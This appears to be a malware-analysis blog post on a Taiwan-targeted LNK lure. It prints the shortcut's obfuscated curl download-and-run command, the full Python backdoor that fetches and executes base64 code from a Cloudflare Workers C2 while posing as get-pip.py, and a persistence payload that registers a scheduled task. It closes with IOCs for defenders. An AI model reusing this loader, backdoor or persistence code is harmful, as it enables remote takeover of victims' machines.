---
title: Python Backdoor Uploaded from Taiwan
by: dmpdump
tags: cti malware python
---

On April 18, 2025, I came across an interesting LNK file uploaded from Taiwan (f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472), which I subsequently found had been initially discovered by [@NtAlertThread](https://x.com/ElementalX2/status/1913247237771083802). Props to him for the discovery.
The LNK file in question is named `2025416-方案1-方案細節.pdf.lnk`, which translates to `2025416-Scheme 1-Scheme details.pdf.lnk`. The file was uploaded from Taiwan on April 18, 2025.

![sshot](/assets/images/bdoor_tw/vt.png)

 This shortcut file is a simple curl downloader for a next stage executable. The executable, named `setup.exe`, is downloaded from `mail[.]9kyd.com/skins` to `C:\Users\Public\Downloads`.

```batch
/c ^c^u^r^l https://mail[.]9kyd.com/skins/setup.exe -o C:\Users\Public\Downloads\setup.exe && (^s^t^a^r^t /^B C:\Users\Public\Downloads\setup.exe)
```
According to the LNK metadata, it was created on a machine named `desktop-8g6b11u` on April 13, 2025.

![sshot](/assets/images/bdoor_tw/lnk_meta.png)

`Setup.exe` (4e256572e001b76872074878f8ecd2be3f237c9b3a18d0059e2f4a3888579b5b) is an installer created with Indigo Rose Software Setup Factory. In the past, I saw multiple Gh0stRAT samples targeting Chinese-speaking users using this installer. Indigo Rose's Setup Factory supports Lua scripting to configure the installation process.

![sshot](/assets/images/bdoor_tw/indigo.png)

Upon execution, the installer drops files to `C:\Users\%USER%\AppData\Roaming\AcrobatReader\`, including the Python runtime environment and a decoy PDF. The installer opens the decoy PDF, named `document.pdf`, which contains illegible content, and runs a python script named `setup.py`.

Excerpt from the PDF content:

![sshot](/assets/images/bdoor_tw/pdf.png)

Dropped files:

![sshot](/assets/images/bdoor_tw/dropped.png)


# Backdoor

The `setup.py` script is a very simple backdoor that uses Cloudflare Workers as command and control infrastructure. The backdoor:
* Runs a continuous loop with a delay which starts a new thread and runs the `mythread()` function
* Makes a request to the C2 `eip.netask.workers[.]dev` and reads the response
* Checks if the response is GZIP-compressed. If it is, it decompresses it
* It converts the response to UTF-8
* If the length of the response is longer than 2 characters, it base64-decodes it and executes it, skipping the first 2 characters

```python
#!/usr/bin/env python
#
# Hi There!
#
# You may be wondering what this giant blob of binary data here is, you might
# even be worried that we're up to something nefarious (good for you for being
# paranoid!). This is a base85 encoding of a zip file, this zip file contains
# an entire copy of pip (version 24.0).
#
# Pip is a thing that installs packages, pip itself is a package that someone
# might want to install, especially if they're looking to run this get-pip.py
# script. Pip has a lot of code to deal with the security of installing
# packages, various edge cases on various platforms, and other such sort of
# "tribal knowledge" that has been encoded in its code base. Because of this
# we basically include an entire copy of pip inside this blob. We do this
# because the alternatives are attempt to implement a "minipip" that probably
# doesn't do things correctly and has weird edge cases, or compress pip itself
# down into a single file.
#
# If you're wondering how this is created, it is generated using
# `scripts/generate.py` in https://github.com/pypa/get-pip.

import copy
import datetime
import html
import http.client
import io
import mimetypes
import os
import posixpath
import select
import shutil
import sys,time,_thread,urllib.request,base64,random
total, used, free = shutil.disk_usage("/")
sid = str(total%9999)

stime=60
url = "hxxps://eip.netask.workers[.]dev/"
hdr = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
	'Accept-Encoding':'gzip, deflate, identity',
	'Session':sid,
	'DNT':'1',
	'Cookie':'',
	'Sec-Fetch-Dest':'empty',
	'Sec-Fetch-Mode':'cors',
	'Sec-Fetch-Site':'same-origin'
}

def mythread(axcs):
	print('mythread...')
	try:
		hdr['Cookie']=''
		req = urllib.request.Request(url, headers=hdr)
		response = urllib.request.urlopen(req)
		
		rsph = response.info()
		if ('Content-Encoding' in rsph and rsph['Content-Encoding'] == 'gzip') or ('content-encoding' in rsph and rsph['content-encoding'] == 'gzip'):
			import gzip
			content = gzip.decompress(response.read())
		else:
			content = response.read()
		html = content.decode('utf-8').strip()
		if len(html) > 2:
			exec(base64.b64decode(html[2:]).decode())
	except Exception as ex:
		print(ex)

try:
	while True:
		print('...:',stime)
		i = 0
		while i < stime:
			time.sleep(1)
			i = i + 1
		_thread.start_new_thread( mythread, (1, ) )
except:
	pass

```
In order to get additional payload without executing it, I modified the `mythread()` function to write the payload to disk instead of executing it:

```python
 rsph = response.info()
        if ('Content-Encoding' in rsph and rsph['Content-Encoding'] == 'gzip') or ('content-encoding' in rsph and rsph['content-encoding'] == 'gzip'):
            import gzip
            content = gzip.decompress(response.read())
        else:
            content = response.read()
        content_text = content.decode('utf-8').strip()  
        if len(content_text) > 2:
            payload = base64.b64decode(content_text[2:])
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"payload_{timestamp}.bin"
            with open(filename, "wb") as f:
                f.write(payload)
            print(f"Payload saved to {filename}")
```

After some initial requests without any reponses, I obtained two payloads:

![sshot](/assets/images/bdoor_tw/response.png)

The first payload I received is a Python script which creates a Visual Basic persistence script named `start.vbs`. The script searches for the running processes, if it finds that python.exe is running, it exits. If it is not running, it runs the initial setup.py (the backdoor) with python.exe. Additionally, it creates a scheduled task named `TaskMachineCore`, which runs every 10 minutes, executing the newly created `start.vbs` persistence script.

```python
pwd = os.path.abspath(os.path.dirname(__file__))
fvb2 = pwd+'\\start.vbs'
fp=open(fvb2,'w')
fp.write('''set ii = getobject("winmgmts:win32_process").instances_
for each p in ii
if p.name = "python.exe" then
WScript.Quit
end if
next
''')
fp.write('CreateObject("WScript.Shell").Run "'+pwd+"\\python.exe "+pwd+"\\setup.py"+'",0')
fp.close()

name = os.path.abspath(os.path.dirname(__file__))
os.system('Schtasks /create /tn TaskMachineCore /tr '+fvb2+' /sc MINUTE /mo 10 /F')
```
The second payload simply modifies the sleep time of the backdoor through the modification of the `stime` variable, changing it from the default value of 60 seconds (1 minute) to 3600 (one hour).

```python
global stime
stime=3600
```

# IOCs
* 2025416-方案1-方案細節.pdf.lnk: f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472
* Payload hosting site: mail[.]9kyd.com/skins
* Setup.exe: 4e256572e001b76872074878f8ecd2be3f237c9b3a18d0059e2f4a3888579b5b
* Setup.py: 6721f5c45548b75af91526bf0afc83dd0017572453e3a37bd95b8b6ac98b9746
* C2: https://eip.netask.workers[.]dev:443